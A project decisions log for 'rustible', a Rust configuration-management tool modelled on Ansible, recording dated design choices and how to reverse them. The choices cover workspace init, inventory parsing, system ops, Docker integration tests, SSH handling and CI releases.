# Decisions

One line per decision, each with how to reverse it. Append; do not rewrite.
Format: `- [M<n>] <date> <decision>: <why>; <how to reverse>`.
Cadu reviews these; a decision he rejects is reversed in a follow-up task and
the vision doc is amended if the question deserved a real answer.
- [M1] 2026-09-08 `rustible init` must generate `[profile.dist]` and `.cargo/config.toml` (rust-lld per musl target) in every workspace: a detached workspace inherits neither from the repo; found when the orchestrator's dist build failed against `examples/workspace`. Reverse: none needed, this is a gap in the M4 brief, not a design change.
- [M1] 2026-09-08 `#[rustible::vars]` rejects maps and tuples syntactically; nested structs cannot be told from enums in a proc macro, so the orchestrator's vars validation (M2/M3) must reject schema properties of `type: object`. Reverse: add a `#[vars]`-side check if a reliable syntactic rule appears.
- [M1] 2026-09-08 `--var k=v` parses `v` as JSON when it parses, else as a string (numbers, bools, lists work without quoting). Reverse: make it string-only and require typed syntax.
- [M1] 2026-09-08 Vars deserialization does NOT use `deny_unknown_fields`: the host var bag is shared by all playbooks targeting the host (vision 10.3), so undeclared keys are legitimate; the runtime warns per undeclared key with a did-you-mean instead. Reverse: add `deny_unknown_fields` in the `#[vars]` expansion.
- [M1] 2026-09-08 Alternating `rustible playbook run` between two playbooks re-links the bin each time (one `selected` OUT_DIR, `rerun-if-env-changed`). Observation for M3: weigh a per-playbook artifact cache keyed by (playbook, triple, source hash) against duplicated dependency artifacts. Reverse: n/a, nothing built.
- [M1] 2026-09-08 `rust-version` raised from 1.85 to 1.88 because the code uses let-chains (stable in 1.88, edition 2024). Reverse: nest the `if let`s.
- [M1] 2026-09-08 Vars flatness is enforced on the generated JSON Schema (`vars::flatness_violations`, resolving `$ref`s) at `--describe` and at `Start`; the macro's syntactic map/tuple rejection is only an early hint. Supersedes the earlier M1 note that deferred this to M2/M3.
- [M4] 2026-09-08 `rustible init` treats a directory holding only `.git` as empty: `git init` before `rustible init` is the common order and vision 10.4 already expects a git repository. Reverse: drop the `.git` exception in `is_empty_dir`.
- [M4] 2026-09-08 `rustible init --name <name>` overrides the package name derived from the directory, and names Cargo refuses (Rust keywords, `test`, `core`, `std`, ...) or that would shadow a dependency (`rustible`, `rustible-std`, ...) are rejected with a message pointing at `--name`: a directory called `type` or `rustible` would otherwise produce a workspace that cannot build. Reverse: remove the flag and the reserved list.
- [M4] 2026-09-08 `.gitignore` lines are `/target` and `/.rustible` (root-anchored, as in `examples/workspace`), and an existing `.gitignore` is appended to whether or not the directory is a git repository (the brief's "inside a git repository" condition only matters when the file exists, and then appending is right either way). Reverse: write `target/` and `.rustible/` and check for `.git` before appending.
- [M4] 2026-09-08 `--path-deps <checkout>` is written into the manifest as given (a relative path is relative to the new workspace, like Cargo's own `path =`), after checking that `<checkout>/crates/{rustible,rustible-std,rustible-build}/Cargo.toml` exist. Reverse: canonicalize to absolute.
- [M4] 2026-09-08 The regeneration test compares `Cargo.toml`, `build.rs`, `src/main.rs` and `.cargo/config.toml` of `examples/workspace` byte for byte, including the version in the shim headers; a version bump therefore requires `rustible init --refresh examples/workspace` (one command, and the test's failure message says so). `src/lib.rs`, `hosts.kdl` and `playbooks/` carry example content and are not compared. Reverse: normalize the version in the test.
- [M4] 2026-09-08 `rustible playbook create` adds `.rs` when the path lacks it, refuses to overwrite an existing file, and warns (but still writes) when the path is outside the workspace's `playbooks/` or outside any workspace, because the build script would not discover it. Reverse: make these errors.
- [M4] 2026-09-08 `--force` keeps existing user-owned files and rewrites only the two shims (review found it overwrote hosts.kdl and src/lib.rs). Reverse: make --force overwrite everything again.
- [M4] 2026-09-08 PROPOSED AMENDMENT for Cadu: `rustible init` refuses any non-empty directory (vision 3); a fresh GitHub clone with README, LICENSE and .gitignore is refused and needs --force. cargo-init-style conflict-based refusal (only when a file init would write already exists) would be friendlier. Not changed; vision doc wins. **DECIDED by Cadu 2026-09-08: adopt the cargo rule.** Implemented on branch `amendments`; see `[M7-amend] init` below.
- [M4] 2026-09-08 Post-init hint prints `cargo run -- hello` with `rustible playbook run` marked "once available", because M3 lands after M4. Reverse: switch the hint when M3 merges (M3 brief should do this).
- [M6-harness] 2026-09-08 Integration tests are opt-in with `RUSTIBLE_INTEGRATION=1` and skip (pass, printing why) without it or without a working `docker`; the brief's "runs in CI when docker is available" becomes "CI sets the variable where docker exists". A plain `cargo test --workspace` never pulls images or builds for musl. Reverse: drop the variable check in `testing::skip_reason` and gate on `docker info` alone.
- [M6-harness] 2026-09-08 The test binary is rebuilt for `<arch>-unknown-linux-musl` in release from inside the running test (`cargo test --no-run --release --target ... --test <file>`, once per process) rather than by an outer wrapper or build script; vision 8.3 wants a static binary and this keeps `cargo test` the only entry point. Consequence: test file names must be valid crate names (underscores). Reverse: a `cargo rustible-test` wrapper that builds first and passes the path in.
- [M6-harness] 2026-09-08 `rustible-std` takes `rustible` as a dev-dependency (a dev-only cycle, the same shape `rustible-macros` already uses) so `tests/` can write `#[rustible::integration_test]` as an op author would. Reverse: re-export the attribute from `rustible-sdk` and drop the dev-dependency.
- [M6-harness] 2026-09-08 The brief's `SystemdImage` variant is `testing::Image::Systemd`, written as `systemd_images = ["..."]` next to `images = [...]` in the attribute (string literals only, so both lists share one syntax). Systemd containers run `--privileged --cgroupns=host` with the host cgroup mounted; the documented images are the third-party `jrei/systemd-debian:12` and `jrei/systemd-ubuntu:24.04` because stock images ship no systemd and installing it per run costs tens of seconds. Reverse: an `images = [systemd("...")]` syntax, or a `Dockerfile` under `crates/rustible-sdk/` that builds our own systemd images.
- [M6-harness] 2026-09-08 In-container detection requires `RUSTIBLE_INTEGRATION_INSIDE` plus `/t`; explicit `RUSTIBLE_INTEGRATION=1` with no docker or an empty image filter is a failure, not a skip. Container bodies run under `timeout 600`; systemd containers have a Drop guard.
- [M6-harness] 2026-09-08 DEFERRED to M7: replace the harness's own Report/StepReport wire format with a replay of `event::Event` via JsonLines (design-quality only).
- [M6-harness] 2026-09-08 Systemd images keep `--cgroupns=host` and the host cgroup bind mount because the jrei images (VOLUME /sys/fs/cgroup) do not boot otherwise; a purpose-built image would allow plain `--privileged`. Reverse: build `rustible/systemd-debian` from six lines and drop both flags.
- [M2] 2026-09-08 Sibling-group conflicts are checked for parameters as well as vars: vision 10.3 decides the rule for vars and 10.2.1 says "nearest group outward" for parameters without saying what a tie means; the same rule keeps `ssh_user` from silently depending on file order. Reverse: skip `ConflictKind::Param` in `check_conflicts`.
- [M2] 2026-09-08 Group distance is the shortest path from the host: the group a host is nested in and every group that lists it in `members` are distance 1, a group listing a distance-d group is d+1, and a group reachable by two paths takes the shorter one. Reverse: change `group_levels`.
- [M2] 2026-09-08 Conflicts are detected at load (every host is resolved in `check_conflicts`, so `inventory check` reports them with the host's line) and `resolve()` re-checks; after a clean load it can only fail on an unknown host. Reverse: drop `check_conflicts` and let `resolve` report.
- [M2] 2026-09-08 `ssh_args` has two spellings because a KDL property holds one value: `ssh_args="-4"` (one string) or a child node `ssh_args "-o" "X"` (the list), and both count as the same parameter for "set twice". Reverse: drop the property form.
- [M2] 2026-09-08 `#null` is rejected in `vars` ("leave a var out instead"), integers must fit i64, lists are positional arguments and may mix scalar types (the schema check reports the type, not the parser). Reverse: map `#null` to an absent key.
- [M2] 2026-09-08 A `group` node lexically inside a `group` is an error pointing at `members` (vision 10.1: groups contain groups through `members`); a host is nested in at most one group by placement (10.2.3) and referenced elsewhere by name. Reverse: allow lexical nesting as sugar for `members`.
- [M2] 2026-09-08 Undeclared vars are warnings, and a schema property of `type: object` is an error, as M1 recorded; `inventory check` validates the file only until M3 wires `--describe`, and the schema-facing API (`validate`, `format_vars_report`) is exercised by tests against a fixture of the M1 `--describe` shape. Reverse: n/a.
- [M2] 2026-09-08 The spike orchestrator's flat flags moved under `rustible run` unchanged (vision 3 is noun-first: `inventory show`, `playbook run`); M3 deletes `run`. Reverse: n/a, temporary.
- [M2] 2026-09-08 `inventory show` prints lists as `[a, b]` and other scalars in KDL 2.0 spelling (`#true`, quoted strings). `[..]` is not KDL (lists are positional arguments there) but reads unambiguously in a table. Reverse: print lists space-separated.
- [M2] 2026-09-08 A single positional var value is a scalar; where the playbook schema wants a list it is coerced to a one-element list on both sides (`vars::coerce_scalars_to_lists`); a var with no values is an empty list. Reverse: add an explicit list syntax and drop the coercion.
- [M2] 2026-09-08 Non-finite floats are refused at parse; integers above i64::MAX are carried as `Scalar::UInt`.
- [M2] 2026-09-08 The built-in `ssh_user` is USER, then LOGNAME, then the uid's /etc/passwd entry, else left to ssh's default (never a `root` guess).
- [M2] 2026-09-08 FOR M3: the orchestrator pre-check validator is a JSON Schema subset; give the `--describe` host build a `--check-vars` mode so serde is the single validator on both sides. Not done in M2.
- [M6] 2026-09-08 `ssh::authorized_keys::Present` (user form) refuses when the user's home directory does not exist instead of creating it root-owned on the way to `~/.ssh` (vision 6.7); `~/.ssh` itself is created because the brief and Ansible's `manage_dir` default ask for it. Reverse: drop the home check in `check_parent`.
- [M6] 2026-09-08 `ssh::authorized_keys`: a requested line that does not parse as a public key fails the step at `check` instead of being appended verbatim, so a playbook typo cannot land in `authorized_keys`. Reverse: append unparseable lines untouched.
- [M6] 2026-09-08 `ssh::authorized_keys`: key identity is `(key_type, key)`; options and comment are ignored for matching and an existing line is never rewritten to match the requested options or comment (Ansible ignores the comment but rewrites options). Reverse: compare options in `same_key` or rewrite the raw line on mismatch.
- [M6-ak] 2026-09-08 `ssh::authorized_keys` requires `~/.ssh` to exist (vision 6.7, decided); the earlier branch decision to create it was reversed on review. Reverse: re-add the create branch and record an amendment.
- [M6-ak] 2026-09-08 A symlinked `authorized_keys` file is refused (atomic rewrite would replace the link); `in_file(real path)` is the workaround. Reverse: resolve the link target and write there.
- [M6-ak] 2026-09-08 User lookup reads `/etc/passwd` only; NSS-only accounts (LDAP, SSSD, systemd-homed) are unsupported by the user-name form, `for_account` covers them. Reverse: route through `getent passwd` via `sys.cmd`.
- [M6-ak] 2026-09-08 SDK gained `stat_follow` (follows symlinks) next to the lstat-based `stat`. Additive.
- [M6-ug] 2026-09-08 `user::Present` and `group::Present` predict their output only when it is honest (vision 12): an existing account or group is always predicted; a new one is predicted only when the uid (gid) is given, and for a user the primary gid must be given explicitly (the earlier private-group `gid == uid` guess was dropped on review: login.defs ranges are not modelled). Otherwise `Plan::change` without a prediction, so a check-mode run that chains from the step stops with the vision's clear message. Reverse: predict with a sentinel and document it.
- [M6-ug] 2026-09-08 `apply` in `user::Present` and `group::Present` executes the `Diff::Attrs` that `check` produced (create when an `exists` change is present, else `Delta::from_changes` for `usermod`) instead of inspecting the system again, then re-reads `/etc/passwd` and `/etc/group` for the real output. Vision 6.2 ("`check` does all the thinking; `apply` executes that diff") and it is what makes the Fake tests able to plant the tool's effect. Reverse: re-run the inspection in `apply`.
- [M6-ug] 2026-09-08 `Present::append` defaults to `true` (Ansible's default is `false`): adding a user to `docker` must not silently drop them from `sudo`; `.append(false)` gives the exact-set semantics. Reverse: flip the default.
- [M6-ug] 2026-09-08 On Alpine (BusyBox) an existing account's uid, gid, home, shell or comment cannot be changed (no `usermod`) and an existing group's gid cannot be changed (no `groupmod`); both fail at `check` naming the `shadow` package. Group membership changes work through `addgroup`/`delgroup`. Reverse: shell out to `usermod` when present.
- [M6-ug] 2026-09-08 `Present::gid` takes `impl Into<GroupId>` (a `u32`, a `&str` name, or `&group::Group`); a numeric gid or a name must already exist in `/etc/group` (vision 6.7), as `useradd -g` itself requires. Reverse: accept only `u32`.
- [M6-ug] 2026-09-08 `group::Absent` fails at `check` when the group is some user's primary group (`groupdel` would refuse in `apply` with a less clear message). Reverse: let `groupdel` fail.
- [M6-ug] 2026-09-08 `user::Membership` is satisfied when the group lists the user or is the user's primary group; adds with `usermod -aG` (BusyBox `addgroup user group`), never removes. `Membership::of(&Account)` / `of_name(..)` and `in_group(&Group)` / `in_group_named(..)` both exist so playbooks can chain from ops or use plain names.
- [M6-ug] 2026-09-08 `/etc/passwd` and `/etc/group` are read directly, as the vision plans; NSS-only accounts (LDAP, SSSD, homed) are not seen, same known limitation as `ssh::authorized_keys`. A line that names the requested user or group but does not parse is an error, not "missing".
- [M6-ug] 2026-09-08 `ssh::authorized_keys::{Present, Absent}::for_user(&user::Account)` (the vision 6.1 shape) added on the lead's instruction as one-line wrappers over `for_account(home, uid, gid)`; the only edit to another op in this branch.
- [M6-ug] 2026-09-08 `user::Present` with no `.groups(..)` leaves supplementary memberships alone whatever `append` says; an explicit empty set with `.append(false)` strips them. Reverse: treat "no groups" as the empty set again.
- [M6-ug] 2026-09-08 `Tools::of` probes for `usermod`/`useradd` and then `busybox`/`adduser` before falling back to the distro name, so `apk add shadow` on Alpine (and BusyBox-only images of other distros) are handled by what is actually installed. Reverse: decide by distro only.
- [M6-ug] 2026-09-08 A relative or empty home is refused at `check` in `user::Present` and in `ssh::authorized_keys`' passwd lookup: `useradd` accepts a relative `-d` and writes it into passwd verbatim, which later resolves against the caller's cwd. Reverse: pass it through.
- [M6] 2026-09-08 The `file` brief asked for `symlink`/`read_link` backend primitives; `read_dir(p) -> Vec<PathBuf>` was added as a third, because `file::Absent` must tell an empty directory from a non-empty one at check time and there is no listing primitive (7.3: one method per primitive, no `ls` through `cmd`). Reverse: drop `read_dir` and make `Absent` always recursive.
- [M6] 2026-09-08 `file::Copy` builder order follows the vision 5.6 example: `Copy::from_bytes(..).to(dest)` finishes the builder and `.mode()/.owner()/.backup()` sit on the finished op (as `Directory` does), rather than before `.to`. Reverse: move the three setters onto `CopyBuilder`.
- [M6] 2026-09-08 When a `Copy` changes both content and attributes, the report shows the content diff only (`Diff` has no shape carrying both); `apply` still sets the attributes. An attributes-only change shows `Diff::Attrs` and does not rewrite the file. Reverse: add a combined `Diff` variant in the SDK.
- [M6] 2026-09-08 `file::Attrs` refuses a symbolic link instead of following it, because `stat` is `lstat` and `chmod` follows, which would make every run report a change on the link's 0777. `file::Symlink` refuses to replace a directory even with `.force(true)` (Ansible refuses too) and `.force` only covers a regular file. Reverse: use `stat_follow` in `Attrs` and allow directory replacement behind `.force`.
- [M6] 2026-09-08 `file::Block` with an empty block removes the managed block (Ansible `blockinfile state=absent`) instead of a separate `Block::Absent` type: the marker is the identity and the empty content is a natural "nothing between the markers". `plan_block` takes the first BEGIN and the first END after it; an orphan BEGIN counts as no block (Ansible takes the last of each and swaps). Reverse: add `file::BlockAbsent`.
- [M6] 2026-09-08 Observation for the SDK, not changed here: `Local::write` creates a new file at 0600 (tempfile's default) when nothing existed, so `Copy` and `Line::create(true)` without `.mode()` produce 0600 files where Ansible would give `0666 & ~umask`. The op tests cannot see it (the Fake creates 0644). Suggest `Local::write` chmod new files to 0644 or apply the umask.
- [M6-file] 2026-09-08 `Backend::remove` is single-entry (empty dir or file); `remove_all` is the only recursive delete. `rename` added for atomic replacement. New files from `Local::write` get 0666 minus umask. The fake resolves symlinks for reads and `stat_follow`; a write at a link's path replaces the link (mirrors Local). `Line`/`Block` refuse symlinked paths. Reverse: per item, see the M6-file-ops report self-review.
- [M6-sd] 2026-09-08 `systemd` state ops run both probes (`is-enabled`, `is-active`) in `check` and refuse a unit `is-enabled` reports as not found (`not-found` on systemd 253+, empty stdout with a non-zero exit before), because `is-active` answers `inactive` for a unit that does not exist and `Stopped` would otherwise be silently satisfied on a typo. Reverse: drop the `NotFound` bail in `probe_existing`.
- [M6-sd] 2026-09-08 `systemd::Disabled` refuses `generated` and `transient` units with the same message as `static`: all three have no `[Install]` section, `systemctl disable` exits 0 on them without changing anything, and the op would report `changed` on every run. `alias`, `indirect` and `linked` go through `systemctl disable` as Ansible does. Reverse: shrink `EnabledState::cannot_be_disabled` to `Static`.
- [M6-sd] 2026-09-08 `systemd::Enabled` and `systemd::Running` refuse a `masked` unit with a message naming `systemctl unmask` instead of unmasking (vision 6.7: one resource per op); `Disabled` treats `masked` as satisfied since the brief counts it as not enabled. Reverse: add an `.unmask(true)` builder.
- [M6-sd] 2026-09-08 `EnabledState::is_enabled` follows `systemctl is-enabled`'s own exit-0 table (`enabled`, `enabled-runtime`, `alias`, `static`, `indirect`, `generated`, `transient`); `linked`/`linked-runtime` count as not enabled, as systemctl exits 1 on them. Reverse: move `linked` across.
- [M6-sd] 2026-09-08 After `systemctl enable`/`disable` the op re-reads `is-enabled` and fails if the word did not flip (systemctl exits 0 with only a warning for a unit it cannot enable), so a step never reports `changed` for a no-op. Reverse: drop the two `ensure!`s in `apply`.
- [M6-sd] 2026-09-08 `Fake` was not extended with sequenced command responses; state-op apply tests use one fake for `check` and a second for `apply` because the post-apply probes share their argv with the check probes. A `with_cmd_seq` on `Fake` would make those tests single-fake; left for the lead to decide since two sibling branches already touch `fake.rs`. Reverse: n/a.
- [M6-so] 2026-09-08 `apt::Present::update_cache(bool)` became `update_cache(Duration)` (vision 6.8 writes `update_cache(Duration::from_secs(3600))`); there is no `update_cache_always()`, `Duration::ZERO` reads well enough. Reverse: re-add the bool form as a second method.
- [M6-so] 2026-09-08 The apt lists' age is read with `stat -c %Y` through `sys.cmd` (`/var/lib/apt/lists`, then `/var/cache/apt/pkgcache.bin`; unknown age counts as stale) because the SDK's `Stat` carries no mtime and the brief forbids touching the SDK; branch m6-file-ops is already editing `backend/mod.rs`, so adding a field there would conflict. Reverse: add `mtime` to `Stat` and read it with `sys.stat`.
- [M6-so] 2026-09-08 `apt::Latest` refreshes the cache in `apply` only (vision 6.8 places `apt-get update` in `apply`), so a `Latest` whose `check` finds every package current against stale lists reports `ok` without refreshing. Ansible refreshes in check mode too. PROPOSED AMENDMENT for Cadu: let `Latest::check` run `apt-get update` when the lists are older than `max_age` (a command, not a file mutation under 7.3). Not changed; the module docs say to run `apt-get update` via `shell::Command` first when a box never refreshes on its own. **DECIDED by Cadu 2026-09-08: adopt Ansible's behaviour, refresh in `check`.** Implemented on branch `amendments`; see `[M7-amend] apt::Latest` below.
- [M6-so] 2026-09-08 All apt ops, `Present` included, refuse when `!sys.is_root()` (the brief: "all ops refuse when not root"); a non-root dry run of `apt::Present` therefore fails at `check` instead of reporting would-change. Reverse: drop the root check from `require_apt_root` for `Present`.
- [M6-so] 2026-09-08 `apt::Absent` fails on a package in a dpkg state other than installed, config-files or unknown (half-configured, unpacked, ...) instead of guessing; `dpkg --configure -a` is a human's call. Reverse: treat any known state as present.
- [M6-so] 2026-09-08 `apt::Latest` has `.install_recommends(bool)` (default off, `--no-install-recommends` on the install path) mirroring `Present`, so the two ops install the same set for a missing package. Reverse: remove the method.
- [M6-so] 2026-09-08 `hostname::Is::check` reads `/proc/sys/kernel/hostname` through `sys` and only falls back to `facts.hostname` when that file is unreadable: facts are gathered once at startup, so a second step in the same run would otherwise see the old kernel name and report `changed` twice. Reverse: use `facts.hostname` only.
- [M6-so] 2026-09-08 `hostname::Is` validates the name in `check` (not in `new`, which cannot fail) and accepts dotted FQDNs up to 253 characters with 63-character labels; uppercase is allowed (`HOME-GAMES` is the brief's own example). Reverse: reject dots or fold case.
- [M6-so] 2026-09-08 `sysctl::Present` uses its own line planner (`plan_sysctl_line`) instead of `file::plan_line`: `key=value` and `key = value` must count as the same line, duplicates are collapsed onto the first occurrence, and values compare token-wise (`4096 131072 6291456` equals the kernel's tab-separated form). Reverse: replace with `plan_line` and an escaped-key regex, accepting whitespace-only rewrites.
- [M6-so] 2026-09-08 `sysctl::Present` refuses when the drop-in's directory does not exist (vision 6.7: prerequisites are not created silently; `/etc/sysctl.d` exists on every Debian) and, with `apply_now` on, when `/proc/sys/<key>` is missing; with `.apply_now(false)` a missing key is persisted only and `previous_live` is `None`. Reverse: `mkdir_all` the parent; skip the live write silently.
- [M6-so] 2026-09-08 `sysctl::Present::apply` re-plans the file text from the current file instead of carrying it in the diff: `Diff::Attrs` is used so the file and live changes render as one table, and re-reading a small file is cheaper than a second diff variant. Reverse: emit `Diff::Text` and take `after` from it.
- [M6-so] 2026-09-08 `apt::Present` predicts its output only when `apt-cache policy` can name a candidate version for every missing package; otherwise the plan carries the diff with no prediction (vision 12). A stock image with no lists therefore reports "would install" without inventing a version. Reverse: predict with an empty version string.
- [M6-so] 2026-09-08 `apt::Present::apply` installs the names carried in the diff that `check` produced (vision 6.2) and refuses a plan that names none, instead of reading them back out of the prediction; the report is rebuilt from dpkg after the install. Reverse: derive the install list from `change.predicted`.
- [M6-so] 2026-09-08 `hostname::Is` refuses a name longer than 64 characters (the kernel's `HOST_NAME_MAX`, and what systemd accepts), not 253 (DNS). Reverse: raise the limit back to 253 and let `hostnamectl` reject it.
- [M6-sd] 2026-09-08 PROPOSED AMENDMENT for Cadu: `systemctl daemon-reload` is only reachable as the `.daemon_reload(true)` flag on `Restart` and `Reload` (vision 6.4's shape), so a playbook that writes a unit file and wants systemd to notice it must restart or reload some unit. Ansible allows `daemon_reload` alone. A `systemd::DaemonReload` action (always changes, no unit) would be a ~30-line addition; not built, because the brief and vision name six ops. **DECIDED by Cadu 2026-09-08: build it.** Implemented on branch `amendments`; see `[M7-amend] systemd::DaemonReload` below.
- [M7] 2026-09-08 CI runs four jobs: the fmt/clippy/test/doc gate, an MSRV check pinned to the manifest's 1.88, a build of `examples/workspace` (excluded from the cargo workspace, so nothing else compiles it), and the Docker harness with `RUSTIBLE_INTEGRATION=1`. Reverse: fold everything into one job.
- [M7] 2026-09-08 `cargo doc` in CI passes `--lib`: documenting the `rustible` facade crate and rustible-cli's `rustible` binary together collides on `target/doc/rustible/index.html`. Reverse: rename the binary's doc target or drop the doc gate.
- [M7] 2026-09-08 The release workflow patches the version with two seds over the root manifest (the `[workspace.package]` line and the six `[workspace.dependencies]` entries) and fails if any `0.0.1` remains, rather than taking a dependency on cargo-edit. Reverse: `cargo set-version` with cargo-edit installed in the job.
- [M7] 2026-09-08 Each `cargo publish` retries up to eight times, 30 s apart, and treats "the registry already lists this version" as success, so crates.io index lag between the seven crates cannot fail a release and a re-run of the job is safe. Reverse: publish once and let the job fail on lag.
- [M7] 2026-09-08 Release binaries are built with `--profile dist` and no musl-tools: `rust-lld` plus rustup's self-contained musl crt, matching `.cargo/config.toml`. Reverse: install musl-tools and use the GNU linker.
- [M3] 2026-09-08 `--limit host,group` narrows the playbook's `hosts` (Ansible's semantics) instead of replacing them; an item outside the playbook's hosts is a usage error listing them. The brief says "hosts from the attribute (or `--limit`)", which reads either way; narrowing cannot run a playbook on a host its author did not target. Reverse: make `--limit` the target set in `run::select_targets`.
- [M3] 2026-09-08 `ssh_user` and `port` are passed to `ssh` only when the inventory sets them (host, group, or `defaults`); the built-in defaults (local username, 22) are ssh's own defaults, so leaving them out lets `~/.ssh/config` win (vision 5.4 "inherits ~/.ssh/config"). Reverse: drop the `Source::BuiltIn` check in `run::ssh_target`.
- [M3] 2026-09-08 The SSH ControlMaster is launched by the CLI (`ssh -M -f -N -S <socket> ... <ssh_args> <addr>`, `ControlPersist=300`, `StrictHostKeyChecking=accept-new`) and handed to `openssh` through `Session::resume`, because `openssh`'s builder cannot pass arbitrary arguments and the inventory has `ssh_args` (vision 10.2.1). Reverse: use `SessionBuilder` and refuse non-empty `ssh_args`.
- [M3] 2026-09-08 Exit codes: 0 ok; 1 the inventory, the vars pre-check, or a cargo build failed (nothing ran); 2 a host failed (connect, upload, protocol, or a step); 3 the command line was wrong (clap errors included, so a usage error is never mistaken for a failed host). Reverse: n/a, additive.
- [M3] 2026-09-08 The describe cache holds only the `--describe` JSON; the `--check-vars` pre-check needs the host-native binary, so on a cache hit the existing debug binary is asked `--describe` (milliseconds) and used when it is a selected build of that playbook with the identical entry, else rebuilt. A playbook without vars never needs the binary after the first run. Reverse: always run `cargo build` before the pre-check (a fresh no-op build costs a build-script re-run when the selected playbook changed).
- [M3] 2026-09-08 `--check-vars` reports structured problems from the schema walk (`non_flat_vars`, `missing_required`, `type_mismatches` as errors, `unknown_keys` as warnings) and then, when the walk is clean, runs serde on the typed struct; a serde-only failure is reported with an empty `var`. Serde is the authority (vision 10.3), the walk attributes. `vars::unknown_keys` reports nothing for a `null` schema (a no-vars playbook used to warn about every inventory var at `Start`). Reverse: n/a.
- [M3] 2026-09-08 `inventory check` builds the whole workspace once (no `RUSTIBLE_PLAYBOOK`, every playbook, the editor's build) and runs `--describe` and `--check-vars` on that binary, instead of one selected build per playbook; undeclared vars print as `warning:` lines. Reverse: loop over selected builds.
- [M3] 2026-09-08 The runtime's local mode (`<binary> <name>`) prints one line per event through `event::Compact`, or JSON lines with `--json`; the buffered renderer lives in the CLI only (vision 9). Reverse: n/a.
- [M3] 2026-09-08 `--json` prints one object per line, `{"host", "frame"}` for every `Up` frame plus `{"host", "error"|"stderr"|"exit"}` for what the orchestrator adds; a playbook that says `escalate` on a host with `escalate="none"` runs unescalated with a `-v` note (the playbook's own root check reports it). Reverse: n/a.
- [M3] 2026-09-08 `examples/workspace/hosts.kdl` group `lab` gained `vars { package "mc" }` so the brief's done-when runs `cadu/mc` without `--var`. Reverse: n/a.
- [M3] 2026-09-08 Merging main brought the Docker test harness (`rustible_sdk::testing`), which printed through the `Pretty` sink M3 deleted from the SDK; it now uses `Compact`, the SDK's remaining local printer, without the image name prefix (a container runs exactly one host, and libtest already prints the test name). Reverse: give `Compact` an optional label, or move a host-prefixed printer back into the SDK.
- [M3] 2026-09-08 `examples/workspace/playbooks/cadu/mc.rs` keeps its `update_cache: bool` var (inventories and `--var update_cache=true` from M1/M2 still work) and maps `true` to `apt::Present::update_cache(Duration::ZERO)` after PR 9 changed the method's argument to a `Duration`; the example workspace is not a cargo workspace member, so `cargo test --workspace` cannot catch such breaks and only the done-when run did. Reverse: make the var an age in seconds and pass `Duration::from_secs`.
- [M3] 2026-09-08 The remote upload writes to `<path>.$$.tmp` (the remote shell's pid) and removes it on failure, because the final path is a content hash shared by concurrent runs and `exists` only tests for an executable file, so a mixed temp file moved into place would be a permanent cache hit. Reverse: go back to a fixed `.tmp` name.
- [M3] 2026-09-08 The CLI's frame reader caps a frame at 64 MiB, the SDK's ceiling, and reports a protocol error naming `ctx.log`: a playbook that writes to stdout desyncs the stream and any four bytes then read as a length. Reverse: allocate whatever the length says.
- [M3] 2026-09-08 Everything between spawning the playbook binary and its stdout EOF runs in `drive_frames`, whose caller attaches the child's stderr to any error, so `sudo -n` being denied reads as sudo's message instead of `Broken pipe`. Reverse: inline the loop again.
- [M3] 2026-09-08 `pick_bin` chooses the `src/main.rs` bin target, falls back to a lone bin elsewhere, and refuses a workspace with several by name; cargo metadata promises no target order, so taking the first `bin` could silently drive a user's `src/bin/tool.rs`. Reverse: take the first bin.
- [M3] 2026-09-08 The global `--workspace` resolves a relative path for `playbook create` and is a usage error for `init` (whose directory is its argument), rather than being accepted and ignored. Reverse: ignore it again.
- [M3] 2026-09-08 A build or artifact-read failure after the hosts are connected is reported against every host and closes their transports rather than returning early, so the run still prints its summary and no ssh ControlMaster is stranded. Reverse: propagate with `?`.
- [M3] 2026-09-08 KNOWN GAP (review, not fixed): the describe cache key hashes the playbook source and `Cargo.lock` only, so editing a path dependency (the example workspace and dogfooding both use them) does not invalidate it. No observable failure could be constructed today, because `check_binary` re-describes and rebuilds on a mismatch and the `Hello` check catches protocol drift. Close it by hashing the resolved path-dependency sources or a build fingerprint.
- [M6-sh] 2026-09-08 `Op` gained `changed_by_apply(&self, &Output) -> bool` (default `true`), asked by `Ctx::step` after a successful `apply`; `false` finishes the step `Ok` with the diff kept and the note "ran, unchanged". This is what `shell::Command::changed_when` needs: an action can only tell after running whether anything happened, and `check` must not run the command (a dry run would execute it). Never consulted in check mode, where such a step reports `would change`. Reverse: drop the method and make `changed_when` a plain post-step `if` in the playbook.
- [M6-sh] 2026-09-08 `shell::Command::changed_when` takes a closure stored as `Arc<dyn Fn(&CommandOutput) -> bool + Send + Sync>`, with a hand-written `Debug` (`"<closure>"`, and stdin plus every env value shown as a byte count, so neither a piped secret nor a `PGPASSWORD` lands in a log; env names and argv stay visible, argv because it reaches the process table anyway); `Clone` still derives. A function pointer or predicate enum was not needed. Reverse: n/a.
- [M6-sh] 2026-09-08 `shell::Command::sh(script)` is `/bin/sh -c <script>`, the `ansible.builtin.shell` mapping; `new(program)` stays the `command` mapping. `always_changes()` is false once any of `creates`, `removes` or `changed_when` is set. Reverse: remove `sh`.
- [M6-sh] 2026-09-08 `stdin`/`env` already existed on `Cmd`/`CmdSpec`/`Local::spawn` and the `Fake` records them in `commands()`; the op exposes them. `Local::spawn` now writes stdin from a thread while draining stdout/stderr, so a child that writes more than a pipe buffer before reading its input cannot deadlock (`cat` with 4 MiB is the unit test); EPIPE from a child that never reads is ignored, the exit status tells the story. Reverse: write stdin inline again.
- [M6-sh] 2026-09-08 Check mode and planned prerequisites (PR 6 review finding): `System` gained a planned-resource list shared by every clone of a run (`note_would_create(kind, name, id)`, `would_create(kind, name)`, `would_create_id(kind, id)`; the last two answer `false`/`None` outside check mode). `group::Present::check` notes the group it would create; `user::Present` (`groups`, `gid` by name or gid) and `user::Membership` accept a planned group in check mode and report `would change`. Nothing is created (vision 6.7 holds) and a real run never accepts a group that is not on the machine, so "refuse rather than guess" is intact: the dry run only trusts what an earlier step in the same run said it would do, exactly as the real run trusts that step having done it. A planned group whose gid is unknown appears in the user diff as `group=<name>` and blocks prediction (vision 12); with `group::Present::gid` the gid is known and `.gid(&grp)` predicts. Reverse: delete the three `System` methods and the `would_create` branches; the dry run of vision 6.6 then aborts at the user step again.
